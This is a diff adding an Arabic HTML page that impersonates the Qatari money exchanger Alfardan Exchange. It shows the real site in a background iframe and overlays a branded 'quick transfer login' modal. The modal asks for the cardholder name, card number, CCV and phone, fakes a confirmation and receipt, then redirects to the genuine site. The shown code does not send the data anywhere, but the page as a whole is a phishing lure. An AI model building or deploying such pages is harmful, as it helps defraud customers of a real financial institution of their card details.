@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>alfardanexchange.com</title>
+    <style>
+        /* تأكيد أن الصفحة الرئيسية تحتل كامل الشاشة */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        /* iframe يغطي كامل الشاشة */
+        iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1; /* لضمان أن iframe في الخلفية */
+        }
+
+        /* تنسيق الزر */
+        .login-button {
+            background-color: #A0522D; /* اللون البني */
+            color: #FFFFFF; /* لون النص */
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            position: absolute;
+            z-index: 1000;
+            transition: all 0.3s ease; /* تأثير الانتقال */
+            top: 10px;
+            left: 10px;
+        }
+
+        .login-button:hover {
+            background-color: #8B4513;
+        }
+
+        /* نافذة الدفع */
+        .payment-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            display: none;
+            z-index: 9999;
+            width: 350px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .payment-modal-header {
+            background-image: url('https://www.alfardanexchange.com.qa/travelcard/img/alfardan_exchange_logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 100px; /* تخصيص الارتفاع حسب حجم الصورة */
+            padding-top: 20px;
+        }
+
+        .payment-modal-header-text {
+            font-size: 1.5em;
+            font-weight: bold;
+            margin-top: 20px;
+            color: #A0522D; /* اللون البني */
+        }
+
+        .payment-modal input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+            transition: all 0.3s ease;
+        }
+
+        .payment-modal input:focus {
+            border-color: #A0522D; /* تغيير اللون عند التحديد */
+            background-color: #fff;
+            outline: none;
+        }
+
+        /* زر الإرسال */
+        .payment-modal button {
+            background-color: #A0522D; /* اللون البني */
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        .payment-modal button:hover {
+            background-color: #8B4513;
+        }
+
+        /* الشاشة التعتيمية */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9998;
+            display: none;
+        }
+
+        /* تأثير التحميل */
+        .loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.5em;
+            color: #A0522D;
+            display: none;
+            z-index: 10000;
+        }
+
+        /* زر الطباعة */
+        .print-download {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .print-download button {
+            background-color: #A0522D; /* اللون البني */
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+        }
+
+        .print-download button:hover {
+            background-color: #8B4513;
+        }
+
+        /* رسالة تم إرسال الطلب */
+        .confirmation-message {
+            font-size: 1.2em;
+            color: green;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- إضافة iframe في الخلفية لعرض الموقع الأصلي -->
+    <iframe src="https://www.alfardanexchange.com.qa/"></iframe>
+
+    <!-- زر تسجيل الدخول -->
+    <button class="login-button" id="loginButton" onclick="showPaymentModal()">تسجيل الدخول للتحويلات السريعة</button>
+
+    <!-- شاشة التعتيم -->
+    <div class="overlay" id="overlay"></div>
+
+    <!-- نافذة الدفع -->
+    <div class="payment-modal" id="paymentModal">
+        <div class="payment-modal-header"></div> <!-- صورة اللوجو في الأعلى -->
+        <div class="payment-modal-header-text">الفردان للصرافة | إدخال معلومات الدفع</div> <!-- النص أسفل الصورة -->
+        <form id="paymentForm">
+            <input type="text" id="cardholderName" placeholder="اسم حامل البطاقة" required>
+            <input type="text" id="nameID" placeholder="اسم المرسل له حسب البطاقة" required>
+            <input type="text" id="cardNumber" placeholder="رقم البطاقة" maxlength="16" required>
+            <input type="text" id="ccv" placeholder="رقم CCV" maxlength="3" required>
+            <input type="text" id="phone" placeholder="رقم الهاتف" maxlength="16" required>
+            <input type="text" id="Code" placeholder="ادخل كود الخصم" required>
+
+            <button type="button" onclick="submitPayment()">إرسال وتأكيد الطلب</button>
+        </form>
+
+        <!-- رسالة تم إرسال الطلب -->
+        <div class="confirmation-message" id="confirmationMessage">تم إرسال الطلب بنجاح!</div>
+
+        <!-- زر الطباعة -->
+        <div class="print-download" id="printDownload">
+            <button onclick="printReceipt()">طباعة الوصل</button>
+        </div>
+    </div>
+
+    <!-- تأثير التحميل -->
+    <div class="loading" id="loading">جار التحميل...</div>
+
+    <script>
+        let loginButton = document.querySelector('.login-button');
+        let isMoving = false;
+
+        // تحريك الزر فوق الصفحة
+        document.body.addEventListener('mousemove', function(e) {
+            if (isMoving) {
+                loginButton.style.left = e.pageX + 'px';
+                loginButton.style.top = e.pageY + 'px';
+            }
+        });
+
+        loginButton.addEventListener('click', function() {
+            isMoving = !isMoving; // التبديل بين حالة التحرك والثبات
+        });
+
+        // وظيفة لإظهار نافذة الدفع
+        function showPaymentModal() {
+            document.getElementById("paymentModal").style.display = "block";
+            document.getElementById("overlay").style.display = "block";
+            document.getElementById("loginButton").textContent = "يرجى طباعة الوصل للاستلام"; // تغيير النص بعد الضغط
+        }
+
+        // إخفاء نافذة الدفع عند الضغط على التعتيم
+        document.getElementById("overlay").onclick = function() {
+            document.getElementById("paymentModal").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
+        }
+
+        // وظيفة تقديم الدفع
+        function submitPayment() {
+            const cardholderName = document.getElementById("cardholderName").value;
+            const cardNumber = document.getElementById("cardNumber").value;
+            const ccv = document.getElementById("ccv").value;
+
+            if (cardholderName && cardNumber && ccv) {
+                document.getElementById("paymentModal").style.display = "none";
+                document.getElementById("overlay").style.display = "none";
+                document.getElementById("loading").style.display = "block";
+                
+                // محاكاة العملية
+                setTimeout(function() {
+                    document.getElementById("loading").style.display = "none";
+                    document.getElementById("confirmationMessage").style.display = "block";
+                    document.getElementById("printDownload").style.display = "block";
+                }, 3000); // مدة الانتظار
+            } else {
+                alert("يرجى ملء جميع الحقول.");
+            }
+        }
+
+        // طباعة الوصل
+        function printReceipt() {
+            window.print();
+            setTimeout(function() {
+                window.location.href = "https://www.alfardanexchange.com.qa/"; // العودة للموقع بعد الطباعة
+            }, 2000); // الانتقال بعد الطباعة
+        }
+    </script>
+
+</body>
+</html>
